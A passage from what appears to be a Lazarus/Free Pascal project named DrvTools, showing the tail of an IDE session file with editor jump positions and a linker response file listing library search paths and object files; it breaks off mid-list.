        <Filename Value="unit1.pas"/>
        <Caret Line="1087" Column="3" TopLine="1082"/>
      </Position12>
      <Position13>
        <Filename Value="unit1.pas"/>
        <Caret Line="1125" Column="23" TopLine="1110"/>
      </Position13>
      <Position14>
        <Filename Value="unit1.pas"/>
        <Caret Line="1130" Column="25" TopLine="1124"/>
      </Position14>
      <Position15>
        <Filename Value="unit1.pas"/>
        <Caret Line="1122" Column="28" TopLine="1099"/>
      </Position15>
      <Position16>
        <Filename Value="unit1.pas"/>
        <Caret Line="34" TopLine="11"/>
      </Position16>
      <Position17>
        <Filename Value="unit1.pas"/>
        <Caret Line="1135" TopLine="1093"/>
      </Position17>
      <Position18>
        <Filename Value="unit1.pas"/>
        <Caret Line="1125" Column="35" TopLine="1099"/>
      </Position18>
      <Position19>
        <Filename Value="unit1.pas"/>
        <Caret Line="1086" Column="4" TopLine="1068"/>
      </Position19>
      <Position20>
        <Filename Value="unit1.pas"/>
        <Caret Line="1131" Column="74" TopLine="1093"/>
      </Position20>
      <Position21>
        <Filename Value="unit1.pas"/>
        <Caret Line="34" Column="31" TopLine="11"/>
      </Position21>
      <Position22>
        <Filename Value="unit1.pas"/>
        <Caret Line="1131" Column="70" TopLine="1104"/>
      </Position22>
      <Position23>
        <Filename Value="unit1.pas"/>
        <Caret Line="1133" Column="33" TopLine="1110"/>
      </Position23>
      <Position24>
        <Filename Value="unit1.pas"/>
        <Caret Line="1132" Column="40" TopLine="1110"/>
      </Position24>
      <Position25>
        <Filename Value="unit1.pas"/>
        <Caret Line="1135" Column="13" TopLine="1101"/>
      </Position25>
      <Position26>
        <Filename Value="unit1.pas"/>
        <Caret Line="1128" Column="24" TopLine="1108"/>
      </Position26>
      <Position27>
        <Filename Value="unit1.pas"/>
        <Caret Line="1161" Column="41" TopLine="1124"/>
      </Position27>
      <Position28>
        <Filename Value="unit1.pas"/>
        <Caret Line="1166" Column="45" TopLine="1139"/>
      </Position28>
      <Position29>
        <Filename Value="unit1.pas"/>
        <Caret Line="853" Column="46" TopLine="832"/>
      </Position29>
    </JumpHistory>
    <RunParams>
      <FormatVersion Value="2"/>
      <Modes Count="1" ActiveMode="default">
        <Mode0 Name="default"/>
      </Modes>
    </RunParams>
  </ProjectSession>
</CONFIG>

```

`source/DrvTools/src/link.res`:

```res
SEARCH_DIR("C:\lazarus\lcl\units\i386-win32\win32\")
SEARCH_DIR("C:\lazarus\lcl\units\i386-win32\")
SEARCH_DIR("C:\lazarus\components\lazutils\lib\i386-win32\")
SEARCH_DIR("C:\lazarus\packager\units\i386-win32\")
SEARCH_DIR(".\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\httpd22\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\zorba\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\zlib\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-jedi\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\winceunits\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\webidl\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\vcl-compat\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\unzip\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\tcl\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\symbolic\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\sqlite\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\sdl\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\rtl-unicode\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\rtl-objpas\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\rtl-generics\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\rtl-extra\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\rtl-console\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\rsvg\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\regexpr\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\pxlib\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\ptc\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\postgres\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\pcap\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\pastojs\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\oracle\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\openssl\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\opengles\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\opengl\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\opencl\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\openal\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\oggvorbis\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\odbc\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\odata\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\nvapi\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\numlib\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\mysql\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\mad\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\lua\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\libxml2\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\libvlc\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\libusb\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\libtar\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\libsee\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\libpng\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\libmicrohttpd\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\libgd\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\libenet\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\libcurl\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\jni\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\imagemagick\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\ibase\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\httpd24\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\hermes\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\hash\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\gtk2\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\gtk1\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\graph\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\googleapi\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\gnutls\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\gmp\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\gdbint\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fv\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fppkg\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fpmkunit\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fpindexer\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fpgtk\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fftw\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-xml\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-web\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-stl\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-sound\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-sdo\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-res\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-report\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-registry\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-process\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-pdf\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-passrc\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-net\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-json\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-js\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-fpcunit\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-extra\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-db\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-base\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\fastcgi\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\dblib\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\chm\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\cdrom\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\cairo\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\bzip2\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\aspell\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\a52\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\units\i386-win32\")
SEARCH_DIR("C:\lazarus\fpc\3.2.0\bin\x86_64-win64\")
INPUT(
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\sysinitpas.o
C:\Work\DrvTools\lib\i386-win32\DrvTools.o
C:\Work\DrvTools\lib\i386-win32\DrvTools.or
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\system.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\fpintres.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\objpas.o
C:\lazarus\lcl\units\i386-win32\win32\interfaces.o
C:\lazarus\lcl\units\i386-win32\forms.o
C:\Work\DrvTools\lib\i386-win32\unit1.o
C:\Work\DrvTools\lib\i386-win32\scmsup.o
C:\Work\DrvTools\lib\i386-win32\nativesup.o
C:\lazarus\components\lazutils\lib\i386-win32\lazutf8.o
C:\lazarus\lcl\units\i386-win32\interfacebase.o
C:\lazarus\components\lazutils\lib\i386-win32\fpcadds.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\windows.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\classes.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\sysutils.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl-objpas\strutils.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\rtlconsts.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\types.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\typinfo.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\sysconst.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\windirs.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\math.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-base\gettext.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpimage.o
C:\lazarus\components\lazutils\lib\i386-win32\integerlist.o
C:\lazarus\lcl\units\i386-win32\lcltype.o
C:\lazarus\lcl\units\i386-win32\lclproc.o
C:\lazarus\lcl\units\i386-win32\lmessages.o
C:\lazarus\lcl\units\i386-win32\lclplatformdef.o
C:\lazarus\components\lazutils\lib\i386-win32\graphtype.o
C:\lazarus\lcl\units\i386-win32\graphmath.o
C:\lazarus\lcl\units\i386-win32\intfgraphics.o
C:\lazarus\lcl\units\i386-win32\themes.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\fgl.o
C:\lazarus\components\lazutils\lib\i386-win32\laz_avl_tree.o
C:\lazarus\components\lazutils\lib\i386-win32\lazfileutils.o
C:\lazarus\components\lazutils\lib\i386-win32\lazutilities.o
C:\lazarus\components\lazutils\lib\i386-win32\lazmethodlist.o
C:\lazarus\components\lazutils\lib\i386-win32\lazutf8classes.o
C:\lazarus\components\lazutils\lib\i386-win32\lazloggerbase.o
C:\lazarus\components\lazutils\lib\i386-win32\laztracer.o
C:\lazarus\lcl\units\i386-win32\lclstrconsts.o
C:\lazarus\components\lazutils\lib\i386-win32\lazutilsstrconsts.o
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\shlobj.o
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\activex.o
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\shellapi.o
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\commctrl.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl-objpas\variants.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\ctypes.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl-objpas\varutils.o
C:\lazarus\components\lazutils\lib\i386-win32\lazclasses.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\messages.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpreadbmp.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpwritebmp.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\bmpcomn.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpreadpng.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpwritepng.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpreadtiff.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpwritetiff.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fptiffcmn.o
C:\lazarus\lcl\units\i386-win32\lclversion.o
C:\lazarus\lcl\units\i386-win32\icnstypes.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpimgcmn.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\pngcomn.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\zstream.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\zbase.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\gzio.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\dos.o
C:\lazarus\fpc\3.2.0\units\i386-win32\hash\crc.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\zdeflate.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\zinflate.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\strings.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\trees.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\adler.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\infblock.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\infutil.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\infcodes.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\inftrees.o
C:\lazarus\fpc\3.2.0\units\i386-win32\paszlib\inffast.o
C:\lazarus\components\lazutils\lib\i386-win32\lazversion.o
C:\lazarus\lcl\units\i386-win32\graphics.o
C:\lazarus\lcl\units\i386-win32\lclintf.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-base\contnrs.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpcanvas.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpreadpnm.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpwritepnm.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpreadjpeg.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpwritejpeg.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpreadgif.o
C:\lazarus\lcl\units\i386-win32\lresources.o
C:\lazarus\lcl\units\i386-win32\lclrescache.o
C:\lazarus\lcl\units\i386-win32\wsreferences.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\clipping.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jpeglib.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdapimin.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdatasrc.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdapistd.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jmorecfg.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdeferr.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jinclude.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jerror.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jmemmgr.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdmarker.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdinput.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcomapi.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jutils.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jmemnobs.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdmaster.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdcolor.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdsample.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdpostct.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jddctmgr.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdphuff.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdhuff.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdcoefct.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdmainct.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jquant1.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jquant2.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdmerge.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdct.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jidctfst.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jidctint.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jidctflt.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jidctred.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcapistd.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcapimin.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jdatadst.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcparam.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcinit.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcmarker.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcphuff.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jchuff.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcmaster.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jccolor.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcsample.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcprepct.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcdctmgr.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jccoefct.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jcmainct.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jfdctint.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jfdctfst.o
C:\lazarus\fpc\3.2.0\units\i386-win32\pasjpeg\jfdctflt.o
C:\lazarus\components\lazutils\lib\i386-win32\lazconfigstorage.o
C:\lazarus\components\lazutils\lib\i386-win32\dynqueue.o
C:\lazarus\components\lazutils\lib\i386-win32\avglvltree.o
C:\lazarus\components\lazutils\lib\i386-win32\lazdbglog.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-base\syncobjs.o
C:\lazarus\components\lazutils\lib\i386-win32\lazutf16.o
C:\lazarus\components\lazutils\lib\i386-win32\fileutil.o
C:\lazarus\components\lazutils\lib\i386-win32\utf8process.o
C:\lazarus\components\lazutils\lib\i386-win32\lazsysutils.o
C:\lazarus\components\lazutils\lib\i386-win32\maps.o
C:\lazarus\lcl\units\i386-win32\tmschema.o
C:\lazarus\components\lazutils\lib\i386-win32\masks.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-process\process.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-process\pipes.o
C:\lazarus\lcl\units\i386-win32\win32\win32int.o
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\multimon.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\character.o
C:\lazarus\lcl\units\i386-win32\controls.o
C:\lazarus\lcl\units\i386-win32\buttons.o
C:\lazarus\lcl\units\i386-win32\dialogs.o
C:\lazarus\lcl\units\i386-win32\stdctrls.o
C:\lazarus\lcl\units\i386-win32\menus.o
C:\lazarus\lcl\units\i386-win32\comctrls.o
C:\lazarus\lcl\units\i386-win32\win32\win32def.o
C:\lazarus\lcl\units\i386-win32\spin.o
C:\lazarus\components\lazutils\lib\i386-win32\translations.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\unicodedata.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\unicodenumtable.o
C:\lazarus\lcl\units\i386-win32\imglist.o
C:\lazarus\lcl\units\i386-win32\propertystorage.o
C:\lazarus\lcl\units\i386-win32\actnlist.o
C:\lazarus\lcl\units\i386-win32\lclclasses.o
C:\lazarus\components\lazutils\lib\i386-win32\uitypes.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fpimgcanv.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\fppixlcanv.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\pixtools.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-image\ellipses.o
C:\lazarus\lcl\units\i386-win32\wslclclasses.o
C:\lazarus\lcl\units\i386-win32\wsimglist.o
C:\lazarus\lcl\units\i386-win32\wsproc.o
C:\lazarus\lcl\units\i386-win32\wsfactory.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-base\rttiutils.o
C:\lazarus\lcl\units\i386-win32\wsmenus.o
C:\lazarus\components\lazutils\lib\i386-win32\lazlogger.o
C:\lazarus\components\lazutils\lib\i386-win32\lazstringutils.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-base\custapp.o
C:\lazarus\lcl\units\i386-win32\customtimer.o
C:\lazarus\lcl\units\i386-win32\clipbrd.o
C:\lazarus\lcl\units\i386-win32\helpintfs.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-base\singleinstance.o
C:\lazarus\fpc\3.2.0\units\i386-win32\chm\fasthtmlparser.o
C:\lazarus\lcl\units\i386-win32\wscontrols.o
C:\lazarus\lcl\units\i386-win32\wsforms.o
C:\lazarus\lcl\units\i386-win32\imagelistcache.o
C:\lazarus\components\lazutils\lib\i386-win32\textstrings.o
C:\lazarus\components\lazutils\lib\i386-win32\extendedstrings.o
C:\lazarus\lcl\units\i386-win32\wsstdctrls.o
C:\lazarus\lcl\units\i386-win32\wsbuttons.o
C:\lazarus\lcl\units\i386-win32\buttonpanel.o
C:\lazarus\lcl\units\i386-win32\extctrls.o
C:\lazarus\lcl\units\i386-win32\lcltaskdialog.o
C:\lazarus\lcl\units\i386-win32\popupnotifier.o
C:\lazarus\lcl\units\i386-win32\wsextctrls.o
C:\lazarus\lcl\units\i386-win32\wsdialogs.o
C:\lazarus\lcl\units\i386-win32\toolwin.o
C:\lazarus\lcl\units\i386-win32\wscomctrls.o
C:\lazarus\lcl\units\i386-win32\wstoolwin.o
C:\lazarus\lcl\units\i386-win32\wsspin.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-json\jsonscanner.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-json\jsonparser.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-json\fpjson.o
C:\lazarus\components\lazutils\lib\i386-win32\lconvencoding.o
C:\lazarus\components\lazutils\lib\i386-win32\stringhashlist.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-json\jsonreader.o
C:\lazarus\lcl\units\i386-win32\win32\win32proc.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsfactory.o
C:\lazarus\lcl\units\i386-win32\win32\win32wscontrols.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsbuttons.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsmenus.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsstdctrls.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsdialogs.o
C:\lazarus\lcl\units\i386-win32\win32\win32themes.o
C:\lazarus\lcl\units\i386-win32\win32\win32extra.o
C:\lazarus\lcl\units\i386-win32\lclmessageglue.o
C:\lazarus\lcl\units\i386-win32\calendar.o
C:\lazarus\lcl\units\i386-win32\extdlgs.o
C:\lazarus\lcl\units\i386-win32\checklst.o
C:\lazarus\lcl\units\i386-win32\grids.o
C:\lazarus\lcl\units\i386-win32\wscalendar.o
C:\lazarus\lcl\units\i386-win32\calcform.o
C:\lazarus\lcl\units\i386-win32\wsextdlgs.o
C:\lazarus\lcl\units\i386-win32\wschecklst.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-xml\htmldefs.o
C:\lazarus\lcl\units\i386-win32\maskedit.o
C:\lazarus\components\lazutils\lib\i386-win32\dynamicarray.o
C:\lazarus\components\lazutils\lib\i386-win32\laz2_xmlcfg.o
C:\lazarus\components\lazutils\lib\i386-win32\lcsvutils.o
C:\lazarus\components\lazutils\lib\i386-win32\lazfilecache.o
C:\lazarus\components\lazutils\lib\i386-win32\laz2_dom.o
C:\lazarus\components\lazutils\lib\i386-win32\laz2_xmlread.o
C:\lazarus\components\lazutils\lib\i386-win32\laz2_xmlwrite.o
C:\lazarus\components\lazutils\lib\i386-win32\laz2_xmlutils.o
C:\lazarus\fpc\3.2.0\units\i386-win32\fcl-base\uriparser.o
C:\lazarus\lcl\units\i386-win32\wsgrids.o
C:\lazarus\lcl\units\i386-win32\win32\win32wscalendar.o
C:\lazarus\lcl\units\i386-win32\win32\win32wschecklst.o
C:\lazarus\lcl\units\i386-win32\win32\win32wscomctrls.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsextctrls.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsextdlgs.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsforms.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsgrids.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsimglist.o
C:\lazarus\lcl\units\i386-win32\win32\win32wsspin.o
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\uxtheme.o
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\commdlg.o
C:\lazarus\lcl\units\i386-win32\editbtn.o
C:\lazarus\lcl\units\i386-win32\groupededit.o
C:\lazarus\lcl\units\i386-win32\calendarpopup.o
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl-objpas\dateutils.o
C:\lazarus\lcl\units\i386-win32\timepopup.o
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-jedi\jwawinsvc.o
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-jedi\jwawinnt.o
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-jedi\jwawintype.o
)
GROUP(
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\libimpsysinitpas.a
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\libimpsystem.a
